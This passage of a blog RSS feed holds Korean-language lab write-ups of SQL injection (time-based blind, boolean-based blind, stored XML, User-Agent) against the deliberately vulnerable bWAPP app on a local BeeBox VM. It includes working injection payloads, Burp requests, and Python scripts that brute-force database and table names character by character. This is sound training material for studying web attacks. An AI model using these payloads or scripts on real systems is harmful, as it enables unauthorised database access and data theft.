      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10797%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Blind (Time-Based)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Time-Based/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Time-Based/</guid>
      <pubDate>Thu, 21 Jan 2021 20:06:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Low&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-38.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;결과는 이</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-38.png" alt="upload successful"><br>결과는 이메일로 전송된다는 말을 보니 페이지에선 어떠한 결과을 받을 수 없을 것 같다.</p><p>sleep 함수를 사용하면 출력하는 것이 지연된다. 이것을 이용하여 지연이 되면 참, 안되면 거짓으로 판단 할 수 있다.</p><p>입력 : <code>&#39; or 1=1 and sleep(1)#</code><br>1초 지연 후 출력되는 것을 볼 수 있다.</p><p>SQLi - Blind (Boolean-based)과 같은 방식에 위와 같은 조건을 추가하면, 지연이 되는 것을 보고 참과 거짓을 판단할 수 있을 것이다.<br><br>Ex).  <code>&#39; or 1=1 and length(database())=~ and sleep(5)#</code></p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Time-Based/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Blind (Boolean-Based)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Boolean-Based/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Boolean-Based/</guid>
      <pubDate>Thu, 21 Jan 2021 20:01:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Boolean-Based-SQLi이란&quot;&gt;&lt;a href=&quot;#Boolean-Based-SQLi이란&quot; class=&quot;headerlink&quot; title=&quot;Boolean Based SQLi이란?&quot;&gt;&lt;/a&gt;Boolean Based SQLi이란?&lt;/h2</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Boolean-Based-SQLi이란"><a href="#Boolean-Based-SQLi이란" class="headerlink" title="Boolean Based SQLi이란?"></a>Boolean Based SQLi이란?</h2><p>SQL Injection의 결과가 참과 거짓으로만 나오는 페이지에서 참, 거짓만으로 DB의 정보를 가지고오는 SQL Injection 공격</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-23.png" alt="upload successful"></p><p>Error로 정보를 얻어보려고 했지만, DB의 에러 메시지는 출력되지 않았다.<br><img src="/images/pasted-24.png" alt="upload successful"></p><p>검색을 위한 SQL문이 <code>SELECT ~~~ FROM ~~~ WHERE ~~~=&#39;입력값&#39;;</code>이라는 형태라는 것을 생각하여 <code>&#39; or &#39;1&#39;=&#39;1</code>를 시도했다.<br><img src="/images/pasted-25.png" alt="upload successful"><br>모든 정보를 가져오려고 했지만, 데이터 출력은 실패하였고, 입력된 데이터와 같은 영화는 DB에 존재한다는 참 출력값을 얻을 수 있었다.</p><p>이번엔 다른 출력값을 보기 위해서 <code>&#39; or &#39;1&#39;=&#39;2</code>를 넣고 결과를 출력하였다.<br><img src="/images/pasted-26.png" alt="upload successful"><br>존재하지 않는다는 거짓 출력값을 얻을 수 있었다.</p><p>이 3개의 출력값을 이용하여 DB의 데이터를 추측할 수 있다.</p><h3 id="컬럼의-갯수-파악"><a href="#컬럼의-갯수-파악" class="headerlink" title="컬럼의 갯수 파악"></a>컬럼의 갯수 파악</h3><p><code>&#39; order by ~;#</code> or <code>union select ~;#</code>를 이용하여 컬럼의 갯수를 파악하겠다.</p><pre><code>- `&#39; order by ~;#`에러 메시지가 나올 때까지 점차 숫자를 올려갔다.</code></pre><p><img src="/images/pasted-27.png" alt="upload successful"><br><img src="/images/pasted-28.png" alt="upload successful"><br>    컬럼의 갯수가 7개라는 것을 알아낼 수 있었다.<br>    - <code>&#39; union select ~;#</code><br>    이것 역시 검색 쿼리에서 지정한 컬럼의 갯수를 알아낼 수 있는 방법 중 하나이다.<br><img src="/images/pasted-29.png" alt="upload successful"><br><img src="/images/pasted-30.png" alt="upload successful"></p><p>컬럼의 갯수 : 7개</p><h3 id="DB의-이름-길이-파악"><a href="#DB의-이름-길이-파악" class="headerlink" title="DB의 이름 길이 파악"></a>DB의 이름 길이 파악</h3><p>length 함수를 이용하여 이름의 길이를 알아낼 것이다.<br><code>&#39; or &#39;1&#39;=&#39;1&#39; and length(database())=~;#</code><br>or는 둘 중 하나만 true면 true가 된다. 하지만 and는 둘 다 true이어야 true가 된다.</p><p><code>&#39; or &#39;1&#39;=&#39;1&#39; and length(database())=1;#</code><br><img src="/images/pasted-31.png" alt="upload successful"></p><p><code>&#39; or &#39;1&#39;=&#39;1&#39; and length(database())=5;#</code><br><img src="/images/pasted-32.png" alt="upload successful"></p><p>위 SQLi를 실행한 결과 DB의 이름 길이는 5자리인 것으로 파악인 된다.</p><h3 id="DB의-이름-파악"><a href="#DB의-이름-파악" class="headerlink" title="DB의 이름 파악"></a>DB의 이름 파악</h3><p>substring 함수를 이용하여 DB의 이름을 알아낼 것이다.<br>substring 함수는 지정된 부분에서 몇 번째 문자를 출력하는 함수이다.</p><p>ex). DB 이름 -&gt; 원투 -&gt; substring(database(),2,1) -&gt; 투 </p><p>이러한 방법은 파이썬을 이용하여 알아내겠다.</p><h4 id="Python-Code"><a href="#Python-Code" class="headerlink" title="Python Code"></a>Python Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">alpha_list = <span class="built_in">list</span>(ascii_lowercase)<span class="comment">#소문자 알파벳 a~z를 리스트로 저장</span></span><br><span class="line">url = <span class="built_in">input</span>()<span class="comment">#시도할 url 입력</span></span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&#x27;DB의 이름 : &#x27;</span><span class="comment">#DB 이름의 알파벳을 저장할 str 변수</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span><span class="comment">#몇번째 자리를 검사할지 결정하는 변수</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> alpha_list:</span><br><span class="line">        <span class="comment">#SQLi 쿼리</span></span><br><span class="line">        sqli = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?title=%27+or+%271%27%3D%271%27+and+substring%28database%28%29%2C<span class="subst">&#123;index&#125;</span>%2C1%29%3D%27<span class="subst">&#123;_&#125;</span>%27%23&amp;action=search&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#세션값을 같이 보내주어 세션 인증</span></span><br><span class="line">        <span class="comment">#PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다.</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;security_level&#x27;</span> : <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;PHPSESSID&#x27;</span> : <span class="string">&#x27;898fa528555e536555feb61910c792c8&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(sqli, cookies=headers)</span><br><span class="line"></span><br><span class="line">        html = response.text</span><br><span class="line">        soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        result = soup.select_one(<span class="string">&#x27;div#main&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#결과가 맞는지 확인하는 조건문</span></span><br><span class="line">        <span class="keyword">if</span> result.contents[<span class="number">-1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) == <span class="string">&#x27;    The movie exists in our database!&#x27;</span>:</span><br><span class="line">            db_name += _<span class="comment">#SQLi 쿼리에 True가 나온 알파벳 저장</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> index &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">print(db_name)</span><br></pre></td></tr></table></figure><p>파이썬 코드로 간단하게 만들었다.<br>처음 파이썬을 접하거나 크롤링을 안해봤던 사람들은 인터넷에 검색하면서 하는데 시간이 좀 걸리겠지만, 금방 할 수 있을 것이다.</p><p><code>&#39; or 1=1 and database()=&#39;bwapp&#39;#</code><br><img src="/images/pasted-33.png" alt="upload successful"><br>결과값으로 bwapp을 얻을 수 있었다.</p><h3 id="테이블-이름의-길이-파악"><a href="#테이블-이름의-길이-파악" class="headerlink" title="테이블 이름의 길이 파악"></a>테이블 이름의 길이 파악</h3><p>일단 이름을 파악하기 위해선 이름의 길이를 파악을 해야한다.</p><p>limit를 이용하여 출력되는 레코드의 개수를 제한한다.<br><code>&#39; or 1=1 and length((select table_name from information_schema.tables where table_schema=&#39;bwapp&#39; limit 0,1))=~#</code><br>~를 1부터 시작하여 길이에 맞는 값이 나오면 참이 출력될 것이다.</p><p>입력 : <code>&#39; or 1=1 and length((select table_name from information_schema.tables where table_schema=&#39;bwapp&#39; limit 0,1))=1#</code><br><img src="/images/pasted-34.png" alt="upload successful"><br>값이 False가 나왔으니 결과값이 DB에 존재하지 않는다고 출력된다.</p><p>입력 : <code>&#39; or 1=1 and length((select table_name from information_schema.tables where table_schema=&#39;bwapp&#39; limit 0,1))=4#</code><br><img src="/images/pasted-35.png" alt="upload successful"><br>True가 나왔으니, 테이블 이름의 길이는 4로 판단이 된다.</p><h3 id="테이블-이름-파악"><a href="#테이블-이름-파악" class="headerlink" title="테이블 이름 파악"></a>테이블 이름 파악</h3><p><code>&#39; or 1=1 and substring((select table_name from information_schema.tables where table_schema=&#39;bwapp&#39; limit 0,1),1,1)=&#39;~&#39;#</code><br>이번 역시 substring 함수를 이용하여 이름의 한글자 하나하나 검사하였다.</p><h4 id="Python-Code-1"><a href="#Python-Code-1" class="headerlink" title="Python Code"></a>Python Code</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">alpha_list = <span class="built_in">list</span>(ascii_lowercase)</span><br><span class="line">url = <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line">db_name = <span class="string">&#x27;테이블의 이름 : &#x27;</span></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> alpha_list:</span><br><span class="line">        sqli = <span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?title=%27+or+1=1+and+substring((select+table_name+from+information_schema.tables+where+table_schema=%27bwapp%27+limit+0,1),<span class="subst">&#123;index&#125;</span>,1)=%27<span class="subst">&#123;_&#125;</span>%27%23&amp;action=search&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#세션값을 같이 보내주어 세션 인증</span></span><br><span class="line">        <span class="comment">#PHPSESSID은 확인하여 자신의 세션값을 넣으면 된다.</span></span><br><span class="line">        headers = &#123;<span class="string">&#x27;security_level&#x27;</span> : <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;PHPSESSID&#x27;</span> : <span class="string">&#x27;321bc53ee5ae297a46333feceff717dd&#x27;</span>&#125;</span><br><span class="line">        response = requests.get(sqli, cookies=headers)</span><br><span class="line"></span><br><span class="line">        html = response.text</span><br><span class="line">        soup = BeautifulSoup(html, <span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">        result = soup.select_one(<span class="string">&#x27;div#main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> result.contents[<span class="number">-1</span>].replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>) == <span class="string">&#x27;    The movie exists in our database!&#x27;</span>:</span><br><span class="line">            db_name += _</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> index &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">print(db_name)</span><br></pre></td></tr></table></figure><p><code>&#39; or 1=1 and (select table_name from information_schema.tables where table_schema=&#39;bwapp&#39; limit 0,1)=&#39;blog&#39;#</code><br><img src="/images/pasted-37.png" alt="upload successful"><br>결과로 blog가 나왔다.</p><hr>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Blind-Boolean-Based/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Stored (XML)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-XML/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-XML/</guid>
      <pubDate>Thu, 21 Jan 2021 19:55:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Low&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-17.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;“Any </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-17.png" alt="upload successful"><br>“Any bugs?” 박스를 클릭하여 반응을 살펴봤지만, 아무 반응이 없었다.<br>개발자 도구를 사용하여 소스코드를 확인해보았다.</p><p><code>&lt;input type=&quot;button&quot; onclick=&quot;ResetSecret();&quot; value=&quot;Any bugs?&quot;&gt;</code> 버튼은 클릭 시 ResetSecret 함수를 실행한다.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ResetSecret</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xmlHttp;</span><br><span class="line">    <span class="comment">// Code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">    &#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Code for IE6, IE5</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        xmlHttp = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlHttp.open(<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;sqli_8-2.php&quot;</span>,<span class="literal">true</span>);</span><br><span class="line">    xmlHttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>,<span class="string">&quot;text/xml; charset=UTF-8&quot;</span>);</span><br><span class="line">    xmlHttp.send(<span class="string">&quot;&lt;reset&gt;&lt;login&gt;bee&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ResetSecret 함수의 코드를 확인해보니, XHR(XMLHttpRequest) 함수를 사용하여 sqli_8-2.php에 XML 형식의 데이터를 보내고 있었다.</p><p>Burp Suit을 사용하여 Error를 일으키겠다.<br><img src="/images/pasted-18.png" alt="upload successful"></p><p><strong>Request</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/sqli_8-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.219.164</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;&#x27;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><p><strong>정상 시 나오는 반응</strong><br><img src="/images/pasted-19.png" alt="upload successful"></p><p><strong>Error 시 나오는 반응</strong><br><img src="/images/pasted-20.png" alt="upload successful"><br>여기서는 SQLi를 성공하여 페이지에 데이터를 출력이 안되서, Error Base SQLi로 데이터를 얻어와야한다.</p><p>SQLi를 시도하기 전, SQL Query를 추측하겠다.<br>있던 데이터의 값을 변경하는 것이니, UPDATE 문을 사용했을 것이다.<br><code>UPDATE table_name SET secret=&#39;Any bugs?&#39; WHERE login like bee</code>으로 추측이 된다.</p><p><strong>실패 시</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/sqli_8-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.219.164</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;bee&#x27;+(select 0 from test)+&#x27;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-21.png" alt="upload successful"></p><p><strong>성공 시</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/bWAPP/sqli_8-2.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.219.164</span><br><span class="line"><span class="attribute">Content-Length</span>: 59</span><br><span class="line"><span class="attribute">Content-type</span>: text/xml; charset=UTF-8</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=ca0465714ab59aed85000f85f95a02fa; security_level=0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">&lt;reset&gt;&lt;login&gt;bee&#x27;+(select 0 from users)+&#x27;&lt;/login&gt;&lt;secret&gt;Any bugs?&lt;/secret&gt;&lt;/reset&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-22.png" alt="upload successful"></p><p>Python을 이용하여 무차별 공격을 시도한다면, 테이블을 찾을 수 있다.<br>또한 login의 값을 무차별 공격을 한다면, login의 데이터 값도 얻을 수 있을 것이다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><hr>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-XML/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Stored (User-Agent)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-User-Agent/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-User-Agent/</guid>
      <pubDate>Thu, 21 Jan 2021 19:51:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Low&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-12.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;들어가보니</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p><img src="/images/pasted-12.png" alt="upload successful"><br>들어가보니 아이피랑 User-Agent가 DB에 저장이 된 것 같다.</p><p>HTML의 a태그인 download를 클릭하니, visitors.txt로 로그가 저장이 되었다.<br><img src="/images/pasted-13.png" alt="upload successful"></p><p>Burp Suite를 이용해서 User-Agent를 <code>&#39;</code>로 수정해서 Error가 일어나는지 확인하겠다.<br><img src="/images/pasted-14.png" alt="upload successful"><br>Error가 발생하였고, Mysql로 이루어진 것을 확인하였다.</p><p><code>&#39;</code>으로 만으로 INSERT 문이 어떻게 되었는지 확신이 힘들어서 <code>&#39;test&#39;</code>를 넣어서 다시 확인하였다.<br><img src="/images/pasted-15.png" alt="upload successful"><br>확인해보니,  이제 INSERT 문을 확신 할 수 있었다.<br><code>INSERT INTO table_name VALUES (data, ..., User-Agent, IP address);</code>로 된 것으로 추측이 된다.</p><p>SQLi를 위해 <code>User-Agent : &#39;, version());#</code>로 수정하여 넘겨주었다.<br><img src="/images/pasted-16.png" alt="upload successful"><br>SQLi가 성공하였다.</p><p>그 이후는 다른 SQLi 문제에서 설명했으니 참고하면 된다.</p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><hr>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/Security/">Security</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/">Web</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/">PHP</category>
      
      <category domain="https://lrtk-coder.github.io/categories/Security/Web/PHP/BeeBox/">BeeBox</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/BeeBox/">BeeBox</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-User-Agent/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SQL Injection - Stored (SQLite)</title>
      <link>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-SQLite/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/SQL-Injection-Stored-SQLite/</guid>
      <pubDate>Thu, 21 Jan 2021 19:46:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Low&quot;&gt;&lt;a href=&quot;#Low&quot; class=&quot;headerlink&quot; title=&quot;Low&quot;&gt;&lt;/a&gt;Low&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-5.png&quot; alt=&quot;upload successful&quot;&gt;&lt;br&gt;PHP의 S</description>
        
      
      
      
